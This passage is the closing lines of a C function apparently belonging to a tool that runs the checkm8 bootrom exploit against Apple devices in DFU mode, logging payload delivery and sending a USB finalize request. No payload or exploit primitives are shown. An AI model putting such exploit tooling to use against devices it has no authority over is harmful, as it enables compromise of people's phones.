        log_info("checkm8_stage_patch: payload sent, finalizing");

        send_dfu_finalize(usb);
        usleep(100000);

        ctx->phase = DFU_PHASE_PATCH;
        log_info("checkm8: stage 4 complete -- payload delivered, finalize sent");
        return 0;
    }
#endif /* __APPLE__ */
}
